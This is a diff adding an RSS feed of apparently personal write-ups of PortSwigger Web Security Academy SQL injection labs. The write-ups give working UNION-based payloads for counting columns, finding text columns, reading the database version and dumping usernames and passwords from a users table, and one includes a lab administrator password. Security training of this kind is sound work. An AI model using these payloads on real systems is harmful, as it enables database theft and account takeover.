@@ -1,0 +1,228 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SBK Hugo Site</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/</link><description>Recent content on SBK Hugo Site</description><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/index.xml" rel="self" type="application/rss+xml"/><item><title>Lab: SQL injection attack, listing the database contents on non-Oracle databases :four:</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-_four_/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-_four_/</guid><description>&lt;h1 id="lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-four">
+ Lab: SQL injection attack, listing the database contents on non-Oracle databases :four:
+ &lt;a class="anchor" href="#lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases-four">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application&amp;rsquo;s response so you can use a UNION attack to retrieve data from other tables.
+The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.&lt;/li>
+&lt;li>Goal: To solve the lab, log in as the administrator user.&lt;/li>
+&lt;/ul>
+&lt;h2 id="exp">
+ Exp
+ &lt;a class="anchor" href="#exp">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>
+&lt;p>Determine # of columns
+Payload: &lt;code>?category=Gifts' union select NULL,NULL --&lt;/code>&lt;/p></description></item><item><title>Lab: SQL injection attack, listing the database contents on Oracle</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-oracle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-listing-the-database-contents-on-oracle/</guid><description>&lt;h1 id="lab-sql-injection-attack-listing-the-database-contents-on-oracle">
+ Lab: SQL injection attack, listing the database contents on Oracle
+ &lt;a class="anchor" href="#lab-sql-injection-attack-listing-the-database-contents-on-oracle">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application&amp;rsquo;s response so you can use a UNION attack to retrieve data from other tables.
+The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.&lt;/li>
+&lt;li>Goal: To solve the lab, log in as the administrator user.&lt;/li>
+&lt;li>Hint: There is a built-in table on Oracle called dual which you can use for this purpose. For example: &lt;code>UNION SELECT 'abc' FROM dual&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h2 id="exp">
+ Exp
+ &lt;a class="anchor" href="#exp">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>
+&lt;p>Determine # of columns
+Payload: &lt;code>?category=Lifestyle' union select NULL,NULL from dual--&lt;/code>&lt;/p></description></item><item><title>Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft/</guid><description>&lt;h1 id="lab-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft">
+ Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
+ &lt;a class="anchor" href="#lab-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: his lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.&lt;/li>
+&lt;li>Goal: To solve the lab, display the database version string.&lt;/li>
+&lt;/ul>
+&lt;h2 id="exp">
+ Exp
+ &lt;a class="anchor" href="#exp">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>Consider # of column
+Payload: &lt;code>?category=Accessories' union select NULL,NULL -- #&lt;/code>&lt;/li>
+&lt;li>Consider column type
+Payload: &lt;code>?category=Accessories' union select 'a','a' -- #&lt;/code>
+Both of them contained text.&lt;/li>
+&lt;li>Attack
+Payload: &lt;code>?category=Accessories' union select 'abc',@@version -- #&lt;/code>
+:::spoiler Success Screenshot
+&lt;img src="https://i.imgur.com/vOx5kCK.png" alt="" />
+:::&lt;/li>
+&lt;/ol>
+&lt;h2 id="reference">
+ Reference
+ &lt;a class="anchor" href="#reference">#&lt;/a>
+&lt;/h2></description></item><item><title>Lab: SQL injection attack, querying the database type and version on Oracle</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-oracle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-attack-querying-the-database-type-and-version-on-oracle/</guid><description>&lt;h1 id="lab-sql-injection-attack-querying-the-database-type-and-version-on-oracle">
+ Lab: SQL injection attack, querying the database type and version on Oracle
+ &lt;a class="anchor" href="#lab-sql-injection-attack-querying-the-database-type-and-version-on-oracle">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.&lt;/li>
+&lt;li>Our Goal: To solve the lab, display the database version string.&lt;/li>
+&lt;/ul>
+&lt;h2 id="exp---sqli-cheat-sheet---examining-the-database-in-sql-injection-attacks">
+ Exp - &lt;a href="https://portswigger.net/web-security/sql-injection/examining-the-database">SQLi Cheat Sheet - Examining the database in SQL injection attacks&lt;/a>
+ &lt;a class="anchor" href="#exp---sqli-cheat-sheet---examining-the-database-in-sql-injection-attacks">#&lt;/a>
+&lt;/h2>
+&lt;p>According to the cheat sheet above, we can use the command to fetch the version of this database, e.g.
+&lt;img src="https://i.imgur.com/Qxtgz5u.png" alt="" />
+:::warning
+Before the recon, the hint told you that this database is created by &lt;code>Oracle&lt;/code>. So, you must contained &lt;code>From&lt;/code> preserved word in each query, e.g. &lt;code>SELECT 'abc' FROM dual&lt;/code>
+:::&lt;/p></description></item><item><title>Lab: SQL injection UNION attack, determining the number of columns returned by the query</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query/</guid><description>&lt;h1 id="lab-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query">
+ Lab: SQL injection UNION attack, determining the number of columns returned by the query
+ &lt;a class="anchor" href="#lab-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application&amp;rsquo;s response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.&lt;/li>
+&lt;li>Hint: To solve the lab, determine the number of columns returned by the query by performing a &lt;a href="https://portswigger.net/web-security/sql-injection/union-attacks">SQL injection UNION&lt;/a> attack that returns an additional row containing null values.&lt;/li>
+&lt;/ul>
+&lt;h4 id="exp">
+ Exp
+ &lt;a class="anchor" href="#exp">#&lt;/a>
+&lt;/h4>
+&lt;p>Payload: &lt;code>https://0ab2008b04e96b8f8057358e008d00d0.web-security-academy.net/filter?category=%27%20UNION%20SELECT%20NULL,NULL,NULL--&lt;/code>
+:::spoiler Success Screenshot
+&lt;img src="https://i.imgur.com/yZ3QPPF.png" alt="" />
+:::&lt;/p></description></item><item><title>Lab: SQL injection UNION attack, finding a column containing text</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-finding-a-column-containing-text/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-finding-a-column-containing-text/</guid><description>&lt;h1 id="lab-sql-injection-union-attack-finding-a-column-containing-text">
+ Lab: SQL injection UNION attack, finding a column containing text
+ &lt;a class="anchor" href="#lab-sql-injection-union-attack-finding-a-column-containing-text">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application&amp;rsquo;s response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.&lt;/li>
+&lt;li>Hint: The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.&lt;/li>
+&lt;/ul>
+&lt;h2 id="exp">
+ Exp
+ &lt;a class="anchor" href="#exp">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>
+&lt;p>Determine how many columns it has
+You can use the technique from previous question.
+Payload: &lt;code>?category=' UNION SELECT NULL,NULL,NULL--&lt;/code>&lt;/p></description></item><item><title>Lab: SQL injection UNION attack, retrieving data from other tables</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-data-from-other-tables/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-data-from-other-tables/</guid><description>&lt;h1 id="lab-sql-injection-union-attack-retrieving-data-from-other-tables">
+ Lab: SQL injection UNION attack, retrieving data from other tables
+ &lt;a class="anchor" href="#lab-sql-injection-union-attack-retrieving-data-from-other-tables">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application&amp;rsquo;s response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.&lt;/li>
+&lt;li>Hint: The database contains a different table called users, with columns called username and password.
+To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.&lt;/li>
+&lt;/ul>
+&lt;h4 id="exp">
+ Exp
+ &lt;a class="anchor" href="#exp">#&lt;/a>
+&lt;/h4>
+&lt;ol>
+&lt;li>Using all technique we learned before
+According to union-based technique we learned before, we can consider there&amp;rsquo;re 2 columns in this database and both of them are text strings
+Payload: &lt;code>?category=Lifestyle' UNION SELECT 'Title name','Post content'--&lt;/code>&lt;/li>
+&lt;li>Find the detailed info in &lt;code>users&lt;/code> table
+Payload: &lt;code>?category=Lifestyle' UNION SELECT username, password FROM users--&lt;/code>&lt;/li>
+&lt;li>Login as administrator
+Username: &lt;code>administrator&lt;/code>
+Password: &lt;code>5kg73b7jinl9plif82d3&lt;/code>
+:::spoiler Success Screenshot
+&lt;img src="https://i.imgur.com/kiRM6bX.png" alt="" />
+:::&lt;/li>
+&lt;/ol>
+&lt;h2 id="reference">
+ Reference
+ &lt;a class="anchor" href="#reference">#&lt;/a>
+&lt;/h2></description></item><item><title>Lab: SQL injection UNION attack, retrieving multiple values in a single column</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/lab_-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column/</guid><description>&lt;h1 id="lab-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column">
+ Lab: SQL injection UNION attack, retrieving multiple values in a single column
+ &lt;a class="anchor" href="#lab-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;ul>
+&lt;li>Description: This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application&amp;rsquo;s response so you can use a UNION attack to retrieve data from other tables.&lt;/li>
+&lt;li>Hint: The database contains a different table called users, with columns called username and password.
+To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user.&lt;/li>
+&lt;/ul>
+&lt;h2 id="exp">
+ Exp
+ &lt;a class="anchor" href="#exp">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>Consider how many columns in this table
+Payload: &lt;code>?category=Lifestyle' UNION SELECT NULL,NULL--&lt;/code>&lt;/li>
+&lt;li>Consider the type of each columns
+Payload: &lt;code>?category=Lifestyle' UNION SELECT 1,'a'--&lt;/code>
+As the payload above, the 1st column is number-based string, and 2nd column is text-based string.
+:::spoiler Result
+&lt;img src="https://i.imgur.com/9V0cYHD.png" alt="" />
+:::&lt;/li>
+&lt;li>&lt;font color="FF0000">通靈&lt;/font>: Find username and password
+From the result above, there&amp;rsquo;s just one column is text-based string that we can inject, so we can use concatenate operator &lt;code>||&lt;/code> to concatenate two strings that we query together.
+Payload: &lt;code>?category=Gifts' UNION SELECT NULL,username||'~'||password FROM users--&lt;/code>
+:::spoiler Result
+&lt;img src="https://i.imgur.com/d1zw9eY.png" alt="" />
+:::&lt;/li>
+&lt;li>Login by username and password that we fetch
+:::spoiler Success Screenshot
+&lt;img src="https://i.imgur.com/P9CLaQg.png" alt="" />
+:::&lt;/li>
+&lt;/ol>
+&lt;h2 id="reference">
+ Reference
+ &lt;a class="anchor" href="#reference">#&lt;/a>
+&lt;/h2></description></item><item><title>SQLi - APPRENTICE</title><link>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/sqli---apprentice/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/portswigger-web-security-academy/sql/sqli---apprentice/</guid><description>&lt;h1 id="sqli---apprentice">
+ SQLi - APPRENTICE
+ &lt;a class="anchor" href="#sqli---apprentice">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-portswigger-web-security-academy-web">
+ tags: &lt;code>Portswigger Web Security Academy&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-portswigger-web-security-academy-web">#&lt;/a>
+&lt;/h6>
+&lt;p>[TOC]&lt;/p>
+&lt;h2 id="lab-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data">
+ Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+ &lt;a class="anchor" href="#lab-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>Hint: This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following: &lt;code>SELECT * FROM products WHERE category = 'Gifts' AND released = 1&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h2 id="exp">
+ Exp
+ &lt;a class="anchor" href="#exp">#&lt;/a>
+&lt;/h2>
+&lt;p>Payload: &lt;code>https://0a2700a903496ccd807a2626001400e3.web-security-academy.net/filter?category=%27%20or%20%271%27=%271%27%20--%20#&lt;/code>
+:::spoiler Success Screenshot
+&lt;img src="https://i.imgur.com/pPKFYKj.png" alt="" />
+:::&lt;/p></description></item></channel></rss>
